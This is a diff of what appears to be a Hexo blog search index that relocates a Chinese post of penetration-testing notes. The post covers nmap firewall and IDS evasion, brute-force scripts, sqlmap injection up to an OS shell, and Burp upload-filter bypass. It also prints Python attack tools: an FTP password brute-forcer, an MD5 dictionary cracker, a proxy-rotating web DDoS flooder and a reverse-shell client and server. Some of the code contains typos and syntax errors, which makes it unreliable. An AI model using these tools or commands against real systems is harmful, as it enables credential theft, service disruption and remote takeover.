@@ -81,6 +81,178 @@
       </tags>
   </entry>
   <entry>
+    <title>LINUX-PENETRATION</title>
+    <url>/2021/12/25/LINUX-PENETRATION/</url>
+    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
+<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
+<li>NMAP逃逸方案：<ol>
+<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
+<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
+<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
+<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
+<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
+<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
+<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
+</ol>
+</li>
+</ol>
+<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
+<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
+<li>Whois：<code>nmap --script whois [site]</code></li>
+<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
+</ol>
+<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
+<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
+<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
+</ol>
+<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
+<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
+<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
+<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
+</ol>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
+<li><code>sqlmap -u URL --tables</code></li>
+</ol>
+<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
+<li>实质：使用了ASP一类的动态脚本实现</li>
+<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
+</ol>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
+<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
+<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
+<li>将URL分段</li>
+<li>使用<code>--cookie</code>进行连接</li>
+<li>设置<code>--level</code>等级2级以上</li>
+</ol>
+</li>
+</ol>
+<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
+<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
+<li>操作步骤：<ol>
+<li>方法一：<ol start="2">
+<li>获取表单信息进行分析：找出输入框对应参数变量</li>
+<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
+</ol>
+</li>
+<li>方法二：<ol>
+<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
+<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
+<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
+</ol>
+<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
+<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
+<li><code>--os-cmd=xxx</code></li>
+<li><code>--os-shell</code></li>
+</ol>
+<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
+<li>forwar</li>
+<li>drop：放弃当前数据</li>
+<li>intercept is on&#x2F;off：开关</li>
+<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
+<li>Params：GET请求、POST请求、Cookie参数</li>
+<li>Hex：显示Raw选项的16进制内容</li>
+</ol>
+<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
+<li>Action &gt;&gt; Send to Intruder</li>
+<li>Positions:<ol>
+<li>Add$：选中内容设置为变量</li>
+<li>Clean$：重置变量</li>
+<li>Auto$：自动选取变量</li>
+<li>Refresh</li>
+<li>Attack type:<ol>
+<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
+<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
+<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
+<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Payloads：设置payload模式，配置字典</li>
+<li>start attack：观察len长度，进行筛选</li>
+</ol>
+<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
+<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
+<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
+<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
+<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
+</ul>
+</li>
+</ol>
+<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
+<li>Comparer：自动高亮功能方便比较</li>
+</ol>
+<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
+<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
+<ol>
+<li>hashlib加密明文</li>
+<li>datatime计算程序运行时间</li>
+<li>sys获取输入的密文</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="3-Web密码安全审计工具"><a href="#3-Web密码安全审计工具" class="headerlink" title="3. Web密码安全审计工具"></a>3. Web密码安全审计工具</h2><h2 id="4-ChallengeCallapsar压力测试（CC：WEB-DDOS）"><a href="#4-ChallengeCallapsar压力测试（CC：WEB-DDOS）" class="headerlink" title="4. ChallengeCallapsar压力测试（CC：WEB DDOS）"></a>4. ChallengeCallapsar压力测试（CC：WEB DDOS）</h2><ol>
+<li><p>原理：多线程模拟多合法用户，确保有大量可用的代理地址</p>
+</li>
+<li><p>操作思路：</p>
+<ol>
+<li><p>引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">import threading</span><br><span class="line">url = &quot;http://www.xxxx.com/&quot;</span><br><span class="line">proxies=[&quot;114.xxx.xxx.xx:xxxx&quot;,&quot;xxx.xxx.xxx.xxx:xxxx&quot;,&quot;xxx.xxx.xxx:xxxx&quot;]</span><br><span class="line">class cc(threading.Thread):</span><br><span class="line">def __init__(self,url,proxies):</span><br><span class="line">  super(cc,self).__init__()</span><br><span class="line">  self.url=url</span><br><span class="line">  self.proxies=proxies</span><br><span class="line">  self.start()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CC函数定义</p>
+<ol>
+<li>request.ProxyHandler()函数设置代理服务器</li>
+<li>build_opener()函数创建自定义Opener对象</li>
+<li>Install_opener()函数创建opener</li>
+<li>可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># class cc(threading,Thread):</span><br><span class="line">def run(self):</span><br><span class="line">while True:</span><br><span class="line">  try:</span><br><span class="line">      pro_random = random.choice(self.proxies)</span><br><span class="line">      pro_support = request.ProxyHandler(&#123;&quot;http&quot;:pro_random&#125;)</span><br><span class="line">      opener = request.build_opener(pro_support)</span><br><span class="line">      request.install_opener(opener)</span><br><span class="line">      request.urlopen(self.url)</span><br><span class="line">  except:</span><br><span class="line">          pass</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行循环</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5000):</span><br><span class="line">cc(url.proxies)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h2 id="5-后渗透（维持访问）：TCP反向连接"><a href="#5-后渗透（维持访问）：TCP反向连接" class="headerlink" title="5. 后渗透（维持访问）：TCP反向连接"></a>5. 后渗透（维持访问）：TCP反向连接</h2><ol>
+<li><p>服务端：</p>
+<ol>
+<li>导入socket模块</li>
+<li>安装并绑定套接字，允许最大连接数100，超出则拒绝</li>
+<li>通过一个while循环来接受并发送用户执行的命令</li>
+<li>将结果接收回来并打印</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;&#x27;,1234))</span><br><span class="line">s.listen(100)</span><br><span class="line">conn,addr = s.accept()</span><br><span class="line">while 1:</span><br><span class="line"> command = input(&#x27;......&gt;&#x27;)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     conn.send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     if command == &#x27;&#x27;:</span><br><span class="line">         continue</span><br><span class="line">     conn,send(command.encode(&#x27;gbk&#x27;))</span><br><span class="line">     result = conn.recv(1024)</span><br><span class="line">     print(result.decode(&#x27;gbk&#x27;,&#x27;ignore&#x27;))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端</p>
+<ol>
+<li>使用subprocess执行获得的用户命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess as sp,sys,re</span><br><span class="line">conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">conn.connect((&#x27;127.0.0.1&#x27;,1234))</span><br><span class="line">while 1:</span><br><span class="line"> command = conn.renv(1024)</span><br><span class="line"> if command == &#x27;exit()&#x27;:</span><br><span class="line">     break</span><br><span class="line"> else:</span><br><span class="line">     sh = sp.Popen(command.decode(&#x27;gbk&#x27;),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)</span><br><span class="line">     out,err=sh.communicate()</span><br><span class="line">     conn.send(out)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+        <category>LINUX</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ODAY-软件漏洞分析</title>
     <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<ul>
@@ -255,178 +427,6 @@
         <tag>安全漏洞</tag>
         <tag>0day</tag>
         <tag>Stack overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LINUX-PENETRATION</title>
-    <url>/2021/12/25/LINUX-PENETRATION/</url>
-    <content><![CDATA[<h1 id="NMAP高级嗅探"><a href="#NMAP高级嗅探" class="headerlink" title="NMAP高级嗅探"></a>NMAP高级嗅探</h1><h2 id="网络-防火墙逃逸嗅探"><a href="#网络-防火墙逃逸嗅探" class="headerlink" title="(网络)防火墙逃逸嗅探"></a>(网络)防火墙逃逸嗅探</h2><ol>
-<li>IDS（Intrusion Detection Systems）入侵检测系统</li>
-<li>NMAP逃逸方案：<ol>
-<li>报文分段：<code>nmap -f [IP]</code> &#x2F;&#x2F;将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难</li>
-<li>指定最大传输单元（MTU,Maximum Transmission Unit）：<code>nmap --mtu [num] [IP]</code> 设定TCP&#x2F;IP协议传输数据时最大传输单元，有效实现逃逸</li>
-<li>隐蔽扫描：<code>nmap -D RND:[num] [IP]</code> “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）</li>
-<li>源地址欺骗：<code>nmap -sI [www.baidu.com:80] [IP]</code> 伪造一个地址作为发起扫描的源地址</li>
-<li>源端口欺骗：<code>nmap --source-port [num] [IP]</code> 指定一个随机端口，通过该端口发送数据</li>
-<li>MAC地址欺骗：<code>nmap -sT --spoof-mac [MAC] [IP]</code></li>
-<li>附加随机数据：<code>nmap --data-length [num] [IP]</code> 参杂一些随机数据影响防火墙判断</li>
-</ol>
-</li>
-</ol>
-<h2 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h2><h3 id="1-信息收集脚本"><a href="#1-信息收集脚本" class="headerlink" title="1. 信息收集脚本"></a>1. 信息收集脚本</h3><ol>
-<li>IP信息：<code>nmap --script ip-geolocation-* [IP]</code></li>
-<li>Whois：<code>nmap --script whois [site]</code></li>
-<li>IP反查：<code>nmap --script hostmap-ip2hosts [site]</code></li>
-</ol>
-<h3 id="2-漏洞扫描脚本"><a href="#2-漏洞扫描脚本" class="headerlink" title="2. 漏洞扫描脚本"></a>2. 漏洞扫描脚本</h3><ol>
-<li>windows系统主机漏洞扫描：<code>nmap --script smb-check-vulns.nse -p [IP]</code></li>
-<li>web漏洞扫描：<code>nmap -sV --script=vulscan/vulscan.nse [IP]</code> Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（<a href="http://www.computec.ch/projekte/vulscan/?s=download" title="http://www.computec.ch/projekte/vulscan/?s=download">脚本地址</a>存放于目录\nmap\scripts\下）</li>
-</ol>
-<h3 id="3-渗透测试脚本"><a href="#3-渗透测试脚本" class="headerlink" title="3. 渗透测试脚本"></a>3. 渗透测试脚本</h3><ol>
-<li>FTP服务审计：<code>nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]</code> 通过设定的字典对FTP爆破</li>
-<li>Wordpress密码审计：<code>nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]</code> &#x2F;&#x2F; 可通过设定线程数量提高破解速度：<code>--script-args http-wordpress.threads=[num]</code></li>
-<li>数据库安全审计：<code>nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]</code> (MySQL操作一致)</li>
-</ol>
-<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ol>
-<li><code>sqlmap -u URL --tables</code></li>
-</ol>
-<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><ol>
-<li>实质：使用了ASP一类的动态脚本实现</li>
-<li>存在漏洞位置加 “ * ”：<code>sqlmap -u URL/id/40*.html --dbs</code></li>
-</ol>
-<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
-<li>产生来源：request方法，用户可从提交的参数中获取参数值</li>
-<li><code>sqlmap -u &quot;http://xxx.xxx.xxx/shownews.asp&quot; --cookie &quot;id=25&quot; --tables --level 2</code><ol>
-<li>将URL分段</li>
-<li>使用<code>--cookie</code>进行连接</li>
-<li>设置<code>--level</code>等级2级以上</li>
-</ol>
-</li>
-</ol>
-<h2 id="POST类型注入"><a href="#POST类型注入" class="headerlink" title="POST类型注入"></a>POST类型注入</h2><ol>
-<li>产生来源：（搜索框、登录框）对POST过滤不严</li>
-<li>操作步骤：<ol>
-<li>方法一：<ol start="2">
-<li>获取表单信息进行分析：找出输入框对应参数变量</li>
-<li>使用<code>--data</code>指定注入点：<code>sqlmap -u http://xxx/Login.asp --data &quot;[Name]=1&amp;[Password]=1&quot;</code></li>
-</ol>
-</li>
-<li>方法二：<ol>
-<li>使用<code>--forms</code>sqlmap自动获取相关信息，查看输出结果<code>Payload:</code>处：<code>sqlmap -u http://domain/Login.asp --forms</code></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h2 id="防火墙逃逸"><a href="#防火墙逃逸" class="headerlink" title="防火墙逃逸"></a>防火墙逃逸</h2><ol>
-<li>方案一：<code>--delay 1</code>使用延迟方法逃逸</li>
-<li>方案二：<code>--tamper &quot;xxx.py&quot;</code>执行逃逸脚本（默认脚本位置：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;）</li>
-</ol>
-<h2 id="命令执行与维持访问"><a href="#命令执行与维持访问" class="headerlink" title="命令执行与维持访问"></a>命令执行与维持访问</h2><ol>
-<li>产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制</li>
-<li><code>--os-cmd=xxx</code></li>
-<li><code>--os-shell</code></li>
-</ol>
-<h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><h3 id="1-proxy-gt-gt-Intercept"><a href="#1-proxy-gt-gt-Intercept" class="headerlink" title="1. proxy&gt;&gt;Intercept"></a>1. proxy&gt;&gt;Intercept</h3><ol>
-<li>forwar</li>
-<li>drop：放弃当前数据</li>
-<li>intercept is on&#x2F;off：开关</li>
-<li>Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息</li>
-<li>Params：GET请求、POST请求、Cookie参数</li>
-<li>Hex：显示Raw选项的16进制内容</li>
-</ol>
-<h3 id="2-密码安全审计（Intruder）"><a href="#2-密码安全审计（Intruder）" class="headerlink" title="2. 密码安全审计（Intruder）"></a>2. 密码安全审计（Intruder）</h3><ol>
-<li>Action &gt;&gt; Send to Intruder</li>
-<li>Positions:<ol>
-<li>Add$：选中内容设置为变量</li>
-<li>Clean$：重置变量</li>
-<li>Auto$：自动选取变量</li>
-<li>Refresh</li>
-<li>Attack type:<ol>
-<li>Sniper：适合只有一个变量，每次填入一个参数进行审计</li>
-<li>Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计</li>
-<li>Pitchfork：在两个字典文件中提取一对或一个值覆盖变量</li>
-<li>Cluster bomb：使用两个字典进行排列组合并进行审计</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>Payloads：设置payload模式，配置字典</li>
-<li>start attack：观察len长度，进行筛选</li>
-</ol>
-<h3 id="3-重放攻击"><a href="#3-重放攻击" class="headerlink" title="3. 重放攻击"></a>3. 重放攻击</h3><ol>
-<li>intruder 传递审计结果到 repeater ：重放发送，查看响应内容</li>
-<li>proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）<ul>
-<li>扩展名验证：<code>filename=&quot;xxx.php&quot;</code></li>
-<li>MINI类型验证：<code>Content-Type:</code>2. 文件头校验&#x2F;文件完整性验证：插入真实的[图片文件]</li>
-</ul>
-</li>
-</ol>
-<h3 id="4-响应比较"><a href="#4-响应比较" class="headerlink" title="4. 响应比较"></a>4. 响应比较</h3><ol>
-<li>Comparer：自动高亮功能方便比较</li>
-</ol>
-<h3 id="5-Web漏洞脚本安全审计：Taget-gt-gt-scan"><a href="#5-Web漏洞脚本安全审计：Taget-gt-gt-scan" class="headerlink" title="5. Web漏洞脚本安全审计：Taget &gt;&gt; scan"></a>5. Web漏洞脚本安全审计：Taget &gt;&gt; scan</h3><h3 id="6-cookie安全性随机分析：Sequencer"><a href="#6-cookie安全性随机分析：Sequencer" class="headerlink" title="6. cookie安全性随机分析：Sequencer"></a>6. cookie安全性随机分析：Sequencer</h3><h3 id="7-编码解码器：Decoder"><a href="#7-编码解码器：Decoder" class="headerlink" title="7. 编码解码器：Decoder"></a>7. 编码解码器：Decoder</h3><h3 id="8-第三方模块：Extender"><a href="#8-第三方模块：Extender" class="headerlink" title="8. 第三方模块：Extender"></a>8. 第三方模块：Extender</h3><h1 id="BeFF测试Xss漏洞"><a href="#BeFF测试Xss漏洞" class="headerlink" title="BeFF测试Xss漏洞"></a>BeFF测试Xss漏洞</h1><h1 id="Develop-Penetration-Tools"><a href="#Develop-Penetration-Tools" class="headerlink" title="Develop Penetration Tools"></a>Develop Penetration Tools</h1><h2 id="1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）"><a href="#1-简单的FTP破解程序样式（可优化，加入多线程提高性能等）" class="headerlink" title="1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）"></a>1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ftplib import FTP</span><br><span class="line">def ftp_login(host,username,password)</span><br><span class="line">    try:</span><br><span class="line">        ftp=FTP()</span><br><span class="line">        ftp.connect(host,21)</span><br><span class="line">        ftp.login(username,password)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        print(&quot;[+]Sucess Password:&quot;,password)</span><br><span class="line">    except:</span><br><span class="line">            pass</span><br><span class="line">def ftp_try(host,username,password):</span><br><span class="line">    for i in open(password):</span><br><span class="line">        ftp_login(host,username,i.strip())</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    ftp_try(&#x27;192.168.0.1&#x27;,&#x27;admin&#x27;,&#x27;/home/password.txt&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-MD5破解程序（彩虹表碰撞、穷举法）"><a href="#2-MD5破解程序（彩虹表碰撞、穷举法）" class="headerlink" title="2. MD5破解程序（彩虹表碰撞、穷举法）"></a>2. MD5破解程序（彩虹表碰撞、穷举法）</h2><ol>
-<li><p>python提供了hashlib模块，对明文进行MD5加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hshlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(&#x27;Python&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(md5.hexidigest())</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。</p>
-<ol>
-<li>hashlib加密明文</li>
-<li>datatime计算程序运行时间</li>
-<li>sys获取输入的密文</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import datetime</span><br><span class="line">import sys</span><br><span class="line">name=sys.argv[1]</span><br><span class="line">starttime=datetime.datetime.now()</span><br><span class="line">for i in open(r&#x27;C:/123.txt&#x27;):</span><br><span class="line">    rs=i.strip()</span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(rs.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    newmd5 = md5.hexdigest()</span><br><span class="line">    if newmd5 == name:</span><br><span class="line">        print(&quot;解密成功！明文是：&quot;,rs)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    print(endtime-starttime)      </span><br></pre></td></tr></table></figure></li>
-</ol>
